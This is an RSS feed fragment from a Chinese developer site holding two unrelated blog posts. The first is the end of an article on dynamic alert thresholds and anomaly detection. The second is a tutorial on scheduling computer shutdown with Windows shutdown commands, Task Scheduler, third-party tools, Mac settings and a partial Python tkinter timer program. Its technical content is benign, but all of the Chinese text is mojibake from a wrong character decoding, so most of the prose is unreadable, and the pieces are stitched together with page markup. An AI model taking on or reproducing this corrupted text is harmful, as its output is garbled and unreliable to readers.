<li><strong>æ»‘åŠ¨çª—å£</strong>ï¼šæŒç»­å­¦ä¹ æœ€æ–°çš„ä¸šåŠ¡æ¨¡å¼</li>
<li><strong>å¤šç»´åº¦æ£€æµ‹</strong>ï¼šç»“åˆæŒ‡æ ‡ã€æ‹“æ‰‘ã€ä¸šåŠ¡ã€æ—¶é—´ç­‰å¤šä¸ªç»´åº¦</li>
<li><strong>è‡ªé€‚åº”å­¦ä¹ </strong>ï¼šä»åé¦ˆä¸­æŒç»­ä¼˜åŒ–</li>
</ul>
<h3 data-id="heading-46">10.3 å®æ–½å»ºè®®</h3>
<ol>
<li><strong>ä»å°åšèµ·</strong>ï¼šå…ˆåœ¨1-2ä¸ªæ ¸å¿ƒæœåŠ¡è¯•ç‚¹</li>
<li><strong>å¹¶è¡Œè¿è¡Œ</strong>ï¼šä¸ç°æœ‰ç³»ç»Ÿå¹¶è¡Œï¼Œé€æ­¥åˆ‡æ¢</li>
<li><strong>æŒç»­ä¼˜åŒ–</strong>ï¼šæ ¹æ®åé¦ˆä¸æ–­è°ƒæ•´å‚æ•°</li>
<li><strong>å›¢é˜ŸåŸ¹è®­</strong>ï¼šç¡®ä¿è¿ç»´å›¢é˜Ÿç†è§£æ–°ç³»ç»Ÿ</li>
<li><strong>æ–‡æ¡£å®Œå–„</strong>ï¼šè®°å½•é…ç½®ã€æ¡ˆä¾‹ã€ç»éªŒ</li>
</ol>
<h3 data-id="heading-47">10.4 æœªæ¥è¶‹åŠ¿</h3>
<p><strong>æ™ºèƒ½åŒ–</strong>ï¼šä»è§„åˆ™é©±åŠ¨åˆ°AIé©±åŠ¨</p>
<ul>
<li>æ·±åº¦å­¦ä¹ æ¨¡å‹æ›¿ä»£ä¼ ç»Ÿç»Ÿè®¡æ–¹æ³•</li>
<li>è‡ªåŠ¨æ ¹å› åˆ†æå’Œæ•…éšœé¢„æµ‹</li>
<li>æ™ºèƒ½æ¨èä¿®å¤æ–¹æ¡ˆ</li>
</ul>
<p><strong>è‡ªåŠ¨åŒ–</strong>ï¼šä»å‘Šè­¦åˆ°è‡ªæ„ˆ</p>
<ul>
<li>è‡ªåŠ¨æ‰§è¡Œä¿®å¤åŠ¨ä½œ</li>
<li>é—­ç¯åé¦ˆä¼˜åŒ–</li>
<li>é›¶äººå·¥å¹²é¢„çš„è¿ç»´</li>
</ul>
<p><strong>å…¨å±€åŒ–</strong>ï¼šä»å•ç‚¹åˆ°å…¨å±€</p>
<ul>
<li>å…¨é“¾è·¯è¿½è¸ªä¸åˆ†æ</li>
<li>è·¨ç³»ç»Ÿå…³è”åˆ†æ</li>
<li>ä¸šåŠ¡è§†è§’çš„ç»Ÿä¸€ç›‘æ§</li>
</ul>
<pre><code class="hljs language-csharp" lang="csharp">å®Œæ•´ä»£ç ä»“åº“å¦‚ä¸‹ï¼š
<span class="hljs-built_in">dynamic</span>-threshold-system/
â”œâ”€â”€ core/
â”‚   â”œâ”€â”€ threshold_generator.py      <span class="hljs-meta"># æ ¸å¿ƒé˜ˆå€¼ç”Ÿæˆå™¨</span>
â”‚   â”œâ”€â”€ stl_decomposer.py          <span class="hljs-meta"># STLåˆ†è§£å™¨</span>
â”‚   â””â”€â”€ anomaly_detector.py        <span class="hljs-meta"># å¼‚å¸¸æ£€æµ‹å™¨</span>
â”œâ”€â”€ integrations/
â”‚   â”œâ”€â”€ prometheus.py              <span class="hljs-meta"># Prometheusé›†æˆ</span>
â”‚   â”œâ”€â”€ influxdb.py                <span class="hljs-meta"># InfluxDBé›†æˆ</span>
â”‚   â””â”€â”€ grafana.py                 <span class="hljs-meta"># Grafanaé›†æˆ</span>
â”œâ”€â”€ notifiers/
â”‚   â”œâ”€â”€ dingtalk.py                <span class="hljs-meta"># é’‰é’‰é€šçŸ¥</span>
â”‚   â”œâ”€â”€ email.py                   <span class="hljs-meta"># é‚®ä»¶é€šçŸ¥</span>
â”‚   â””â”€â”€ pagerduty.py               <span class="hljs-meta"># PagerDutyé€šçŸ¥</span>
â”œâ”€â”€ operators/
â”‚   â””â”€â”€ kubernetes_operator.py     <span class="hljs-meta"># K8s Operator</span>
â”œâ”€â”€ tests/
â”‚   â”œâ”€â”€ test_threshold_generator.py
â”‚   â””â”€â”€ test_anomaly_detector.py
â”œâ”€â”€ examples/
â”‚   â”œâ”€â”€ basic_usage.py
â”‚   â””â”€â”€ advanced_usage.py
â”œâ”€â”€ docs/
â”‚   â”œâ”€â”€ architecture.md
â”‚   â”œâ”€â”€ api_reference.md
â”‚   â””â”€â”€ deployment_guide.md
â”œâ”€â”€ requirements.txt
â””â”€â”€ README.md
</code></pre>
<h3 data-id="heading-48">å‚è€ƒèµ„æº</h3>
<p><strong>å­¦æœ¯è®ºæ–‡</strong>ï¼š</p>
<ul>
<li>Cleveland et al. (1990): â€œSTL: A Seasonal-Trend Decomposition Procedure Based on Loessâ€</li>
<li>Laptev et al. (2015): â€œTime-Series Extreme Event Forecasting with Neural Networks at Uberâ€</li>
</ul>
<p><strong>å¼€æºé¡¹ç›®</strong>ï¼š</p>
<ul>
<li>Facebook Prophet: æ—¶é—´åºåˆ—é¢„æµ‹</li>
<li>Twitter AnomalyDetection: å¼‚å¸¸æ£€æµ‹</li>
<li>LinkedIn Luminol: å¼‚å¸¸æ£€æµ‹å’Œå…³è”åˆ†æ</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”µè„‘è®¾ç½®å®šæ—¶å…³æœºæœ‰å¤šç§æ–¹æ³•(å«pythonä»£ç )]]></title>    <link>https://juejin.cn/post/7592552501579284506</link>    <guid>https://juejin.cn/post/7592552501579284506</guid>    <pubDate>2026-01-08T02:27:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592552501579284506" data-draft-id="7592759902675664942" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”µè„‘è®¾ç½®å®šæ—¶å…³æœºæœ‰å¤šç§æ–¹æ³•(å«pythonä»£ç )"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T02:27:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="PieroPC"/> <meta itemprop="url" content="https://juejin.cn/user/1998231182522521"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”µè„‘è®¾ç½®å®šæ—¶å…³æœºæœ‰å¤šç§æ–¹æ³•(å«pythonä»£ç )
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1998231182522521/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    PieroPC
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:27:08.000Z" title="Thu Jan 08 2026 02:27:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸ºç”µè„‘è®¾ç½®å®šæ—¶å…³æœºæœ‰å¤šç§æ–¹æ³•ï¼Œä»ç®€å•åˆ°é«˜çº§ï¼Œæ‚¨å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚é€‰æ‹©ã€‚</p>
<h4 data-id="heading-0">æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Windows è‡ªå¸¦çš„å‘½ä»¤ï¼ˆæœ€ç®€å•é€šç”¨ï¼‰</h4>
<p>è¿™æ˜¯æœ€ç»å…¸ã€æœ€çµæ´»çš„æ–¹æ³•ï¼Œé€‚ç”¨äºæ‰€æœ‰ Windows ç³»ç»Ÿã€‚</p>
<ol>
<li>
<p><strong>æ‰“å¼€â€œè¿è¡Œâ€å¯¹è¯æ¡†</strong>ï¼š</p>
<ul>
<li>æŒ‰é”®ç›˜ä¸Šçš„ <code>Win</code> + <code>R</code> é”®ã€‚</li>
<li>æˆ–è€…åœ¨å¼€å§‹èœå•æœç´¢â€œè¿è¡Œâ€ã€‚</li>
</ul>
</li>
<li>
<p><strong>è¾“å…¥å…³æœºå‘½ä»¤</strong>ï¼š</p>
<ul>
<li>åœ¨æ‰“å¼€çš„è¿è¡Œæ¡†ä¸­ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š
<pre><code class="hljs language-cmd" lang="cmd">shutdown -s -t ç§’æ•°
</code></pre>
<ul>
<li><strong><code>shutdown</code></strong>ï¼šå…³æœºå‘½ä»¤ã€‚</li>
<li><strong><code>-s</code></strong>ï¼šè¡¨ç¤ºå…³é—­è®¡ç®—æœºã€‚</li>
<li><strong><code>-t</code></strong>ï¼šåé¢è·Ÿå»¶è¿Ÿæ—¶é—´ã€‚</li>
<li><strong><code>ç§’æ•°</code></strong>ï¼šæŒ‡å®šå¤šå°‘ç§’åå…³æœºã€‚ä¾‹å¦‚ï¼š
<ul>
<li>1å°æ—¶åå…³æœºï¼š<code>shutdown -s -t 3600</code> ï¼ˆ1å°æ—¶ = 60åˆ†é’Ÿ Ã— 60ç§’ï¼‰</li>
<li>2å°æ—¶åå…³æœºï¼š<code>shutdown -s -t 7200</code></li>
<li>30åˆ†é’Ÿåå…³æœºï¼š<code>shutdown -s -t 1800</code></li>
<li>æ™šä¸Š11ç‚¹å…³æœºï¼ˆå‡è®¾ç°åœ¨æ™šä¸Š10ç‚¹ï¼‰ï¼š<code>shutdown -s -t 3600</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>æ‰§è¡Œå‘½ä»¤</strong>ï¼š</p>
<ul>
<li>ç‚¹å‡»â€œç¡®å®šâ€æˆ–æŒ‰å›è½¦é”®ã€‚</li>
<li>æˆåŠŸåä¼šå¼¹å‡ºä¸€ä¸ªå°çª—å£æç¤ºâ€œWindows å°†åœ¨ XX åˆ†é’Ÿåå…³é—­â€ã€‚</li>
</ul>
</li>
</ol>
<p><strong>å¦‚ä½•å–æ¶ˆå®šæ—¶å…³æœºï¼Ÿ</strong></p>
<ul>
<li>åŒæ ·æ‰“å¼€â€œè¿è¡Œâ€ (<code>Win + R</code>)ï¼Œè¾“å…¥ï¼š
<pre><code class="hljs language-cmd" lang="cmd">shutdown -a
</code></pre>
</li>
<li>æŒ‰å›è½¦ã€‚ç³»ç»Ÿä¼šæç¤ºâ€œè®¡åˆ’çš„å…³é—­å·²å–æ¶ˆâ€ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-1">æ–¹æ³•äºŒï¼šåˆ›å»ºå®šæ—¶å…³æœºçš„å¿«æ·æ–¹å¼ï¼ˆä¸€é”®å¯åŠ¨ï¼‰</h4>
<p>å¦‚æœæ‚¨éœ€è¦é¢‘ç¹ä½¿ç”¨æŸä¸ªå›ºå®šçš„æ—¶é—´ï¼ˆå¦‚ä¸‹è½½å¤§æ–‡ä»¶å¸¸ç”¨2å°æ—¶ï¼‰ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªæ¡Œé¢å¿«æ·æ–¹å¼ã€‚</p>
<ol>
<li>åœ¨æ¡Œé¢ç©ºç™½å¤„ç‚¹å‡»å³é”®ï¼Œé€‰æ‹© <strong>æ–°å»º -&gt; å¿«æ·æ–¹å¼</strong>ã€‚</li>
<li>åœ¨â€œè¯·è¾“å…¥å¯¹è±¡çš„ä½ç½®â€æ¡†ä¸­ï¼Œè¾“å…¥å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š
shutdown -s -t 7200
ï¼ˆè¿™é‡Œä»¥2å°æ—¶/7200ç§’ä¸ºä¾‹ï¼‰</li>
<li>ç‚¹å‡» <strong>ä¸‹ä¸€æ­¥</strong>ï¼Œä¸ºè¿™ä¸ªå¿«æ·æ–¹å¼èµ·ä¸ªåå­—ï¼Œä¾‹å¦‚â€œ2å°æ—¶åå…³æœºâ€ã€‚</li>
<li>ç‚¹å‡» <strong>å®Œæˆ</strong>ã€‚</li>
</ol>
<p>ç°åœ¨ï¼Œåªéœ€åŒå‡»è¿™ä¸ªæ¡Œé¢å›¾æ ‡ï¼Œå°±ä¼šå¯åŠ¨2å°æ—¶åå…³æœºçš„å‘½ä»¤ã€‚</p>
<hr/>
<h4 data-id="heading-2">æ–¹æ³•ä¸‰ï¼šä½¿ç”¨ä»»åŠ¡è®¡åˆ’ç¨‹åºï¼ˆç²¾ç¡®åˆ°å…·ä½“æ—¥æœŸå’Œæ—¶é—´ï¼‰</h4>
<p>å¦‚æœä½ æƒ³è¦åƒè®¾ç½®é—¹é’Ÿä¸€æ ·ï¼Œè®©ç”µè„‘åœ¨<strong>æ¯å¤©æ™šä¸Š11ç‚¹</strong>æˆ–<strong>æ¯å‘¨äº”ä¸‹åˆ5ç‚¹</strong>è‡ªåŠ¨å…³æœºï¼Œè¿™æ˜¯æœ€ä¸“ä¸šçš„æ–¹æ³•ã€‚</p>
<ol>
<li>åœ¨å¼€å§‹èœå•æœç´¢å¹¶æ‰“å¼€ <strong>â€œä»»åŠ¡è®¡åˆ’ç¨‹åºâ€</strong>ã€‚</li>
<li>åœ¨å³ä¾§æ“ä½œæ ï¼Œç‚¹å‡» <strong>â€œåˆ›å»ºåŸºæœ¬ä»»åŠ¡â€</strong>ã€‚</li>
<li><strong>è®¾ç½®åç§°å’Œæè¿°</strong>ï¼šä¾‹å¦‚â€œæ¯æ—¥è‡ªåŠ¨å…³æœºâ€ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ã€‚</li>
<li><strong>é€‰æ‹©è§¦å‘å™¨</strong>ï¼šé€‰æ‹©â€œæ¯å¤©â€ã€â€œæ¯å‘¨â€æˆ–â€œä¸€æ¬¡â€ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ã€‚
<ul>
<li>å¦‚æœé€‰â€œæ¯å¤©â€ï¼Œè®¾ç½®å¼€å§‹æ—¥æœŸå’Œå…·ä½“æ—¶é—´ï¼ˆå¦‚23:00ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>é€‰æ‹©æ“ä½œ</strong>ï¼šé€‰æ‹©â€œå¯åŠ¨ç¨‹åºâ€ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ã€‚</li>
<li><strong>è®¾ç½®ç¨‹åºæˆ–è„šæœ¬</strong>ï¼š
<ul>
<li>åœ¨â€œç¨‹åºæˆ–è„šæœ¬â€æ¡†ä¸­è¾“å…¥ï¼š<code>shutdown</code></li>
<li>åœ¨â€œæ·»åŠ å‚æ•°â€æ¡†ä¸­è¾“å…¥ï¼š<code>-s -f</code> ï¼ˆ<code>-f</code> è¡¨ç¤ºå¼ºåˆ¶å…³é—­æ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºï¼‰</li>
<li><strong>æ³¨æ„</strong>ï¼šè¿™é‡Œä¸éœ€è¦ <code>-t</code> å‚æ•°ï¼Œå› ä¸ºè§¦å‘æ—¶é—´ç”±ä»»åŠ¡è®¡åˆ’æ§åˆ¶ã€‚</li>
</ul>
</li>
<li>ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œç„¶åå®Œæˆã€‚</li>
</ol>
<p>è¿™æ ·ï¼Œç”µè„‘å°±ä¼šåœ¨ä½ è®¾å®šçš„å‘¨æœŸå’Œæ—¶é—´ç‚¹è‡ªåŠ¨å…³æœºã€‚</p>
<hr/>
<h4 data-id="heading-3">æ–¹æ³•å››ï¼šä½¿ç”¨ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼ˆåŠŸèƒ½å…¨é¢ã€ç•Œé¢å‹å¥½ï¼‰</h4>
<p>å¦‚æœä½ è§‰å¾—å‘½ä»¤éš¾è®°ï¼Œæˆ–è€…æƒ³è¦æ›´ç›´è§‚çš„å›¾å½¢ç•Œé¢ï¼Œå¾ˆå¤šè½¯ä»¶å¯ä»¥å¸®ä½ ã€‚</p>
<ul>
<li><strong>æ¨èè½¯ä»¶</strong>ï¼š
<ul>
<li><strong>Shutdown Timer</strong>ï¼šå°å·§ã€å…è´¹ã€æ— å¹¿å‘Šã€‚</li>
<li><strong>Wise Auto Shutdown</strong>ï¼šåŠŸèƒ½ä¸°å¯Œï¼Œå¯ä»¥å®šæ—¶å…³æœºã€é‡å¯ã€ç¡çœ ã€æ³¨é”€ç­‰ã€‚</li>
<li><strong>Airytec Switch Off</strong>ï¼šåŒæ ·åŠŸèƒ½å¼ºå¤§ï¼Œæ”¯æŒè¿œç¨‹ç®¡ç†ã€‚</li>
</ul>
</li>
</ul>
<p><strong>ä½¿ç”¨æ–¹å¼</strong>ï¼š
ä¸‹è½½å®‰è£…åï¼Œè½¯ä»¶ç•Œé¢é€šå¸¸éå¸¸ç›´è§‚ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©â€œå…³æœºâ€ï¼Œç„¶åé€‰æ‹©æ—¶é—´ï¼ˆå¦‚â€œåœ¨â€ã€â€œæ¯å¤© 22:30â€ç­‰ï¼‰ï¼Œæœ€åç‚¹å‡»â€œå¯åŠ¨â€æˆ–â€œåº”ç”¨â€å³å¯ã€‚</p>
<hr/>
<h4 data-id="heading-4">Mac ç”¨æˆ·è®¾ç½®å®šæ—¶å…³æœº</h4>
<ol>
<li>ç‚¹å‡»å±å¹•å·¦ä¸Šè§’çš„ <strong>è‹¹æœèœå•</strong>ï¼Œé€‰æ‹© <strong>â€œç³»ç»Ÿåå¥½è®¾ç½®â€</strong>ã€‚</li>
<li>è¿›å…¥ <strong>â€œèŠ‚èƒ½â€</strong> ï¼ˆæˆ–â€œç”µæ± â€ï¼‰è®¾ç½®ã€‚</li>
<li>ç‚¹å‡»å³ä¸‹è§’çš„ <strong>â€œå®šæ—¶â€¦â€</strong> æŒ‰é’®ã€‚</li>
<li>åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œå‹¾é€‰ç¬¬äºŒä¸ªå¤é€‰æ¡†ã€‚</li>
<li>åœ¨ä¸‹æ‹‰èœå•ä¸­ï¼Œé€‰æ‹© <strong>â€œå…³é—­â€</strong>ï¼Œç„¶åè®¾ç½®ä½ å¸Œæœ›å…³æœºçš„<strong>æ—¥æœŸå’Œæ—¶é—´</strong>ã€‚</li>
<li>ç‚¹å‡» <strong>â€œå¥½â€</strong> ä¿å­˜è®¾ç½®ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-5">pythonä»£ç å®ç°ï¼š</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a063f0e643534b19b6c1cfa0df2c50ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUGllcm9QQw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444027&amp;x-signature=13a3Vx2v36p1BnKSU9v7Yq4g3c8%3D" alt="image.png" loading="lazy"/>
ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ Python tkinter å®ç°å‰ä¸‰ç§å®šæ—¶å…³æœºæ–¹æ³•çš„å®Œæ•´ç¨‹åºï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> tkinter <span class="hljs-keyword">as</span> tk
<span class="hljs-keyword">from</span> tkinter <span class="hljs-keyword">import</span> ttk, messagebox
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> subprocess
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ShutdownTimerApp</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, root</span>):
        self.root = root
        self.root.title(<span class="hljs-string">"å®šæ—¶å…³æœºå·¥å…· v1.0"</span>)
        self.root.geometry(<span class="hljs-string">"600x500"</span>)
        
        <span class="hljs-comment"># è®¾ç½®æ ·å¼</span>
        self.setup_styles()
        
        <span class="hljs-comment"># åˆ›å»ºä¸»ç•Œé¢</span>
        self.create_widgets()
        
        <span class="hljs-comment"># å­˜å‚¨å®šæ—¶ä»»åŠ¡çº¿ç¨‹</span>
        self.shutdown_thread = <span class="hljs-literal">None</span>
        self.is_scheduled = <span class="hljs-literal">False</span>
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setup_styles</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""è®¾ç½®ç•Œé¢æ ·å¼"""</span>
        style = ttk.Style()
        style.configure(<span class="hljs-string">'Title.TLabel'</span>, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">16</span>, <span class="hljs-string">'bold'</span>))
        style.configure(<span class="hljs-string">'Method.TLabelframe.Label'</span>, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">11</span>, <span class="hljs-string">'bold'</span>))
        style.configure(<span class="hljs-string">'Large.TButton'</span>, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>))
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_widgets</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºç•Œé¢ç»„ä»¶"""</span>
        <span class="hljs-comment"># æ ‡é¢˜</span>
        title_label = ttk.Label(self.root, text=<span class="hljs-string">"å®šæ—¶å…³æœºå·¥å…·"</span>, style=<span class="hljs-string">'Title.TLabel'</span>)
        title_label.pack(pady=<span class="hljs-number">20</span>)
        
        <span class="hljs-comment"># åˆ›å»ºç¬”è®°æœ¬æ§ä»¶ï¼ˆé€‰é¡¹å¡ï¼‰</span>
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=<span class="hljs-string">'both'</span>, expand=<span class="hljs-literal">True</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ–¹æ³•ä¸€ï¼šä½¿ç”¨å‘½ä»¤</span>
        self.create_method1_tab()
        
        <span class="hljs-comment"># æ–¹æ³•äºŒï¼šå¿«æ·æ–¹å¼</span>
        self.create_method2_tab()
        
        <span class="hljs-comment"># æ–¹æ³•ä¸‰ï¼šä»»åŠ¡è®¡åˆ’ï¼ˆç®€åŒ–ç‰ˆï¼‰</span>
        self.create_method3_tab()
        
        <span class="hljs-comment"># çŠ¶æ€æ </span>
        self.create_status_bar()
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_method1_tab</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºæ–¹æ³•ä¸€é€‰é¡¹å¡ï¼šä½¿ç”¨å‘½ä»¤"""</span>
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text=<span class="hljs-string">"æ–¹æ³•ä¸€ï¼šå‘½ä»¤è¡Œè®¾ç½®"</span>)
        
        <span class="hljs-comment"># è¯´æ˜æ ‡ç­¾</span>
        desc = <span class="hljs-string">"é€šè¿‡Windows shutdownå‘½ä»¤è®¾ç½®å®šæ—¶å…³æœº\næ”¯æŒè®¾ç½®ä»»æ„ç§’æ•°åå…³æœº"</span>
        desc_label = ttk.Label(frame, text=desc, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>))
        desc_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ—¶é—´è®¾ç½®åŒºåŸŸ</span>
        time_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"è®¾ç½®å…³æœºæ—¶é—´"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        time_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># é¢„è®¾æ—¶é—´æŒ‰é’®</span>
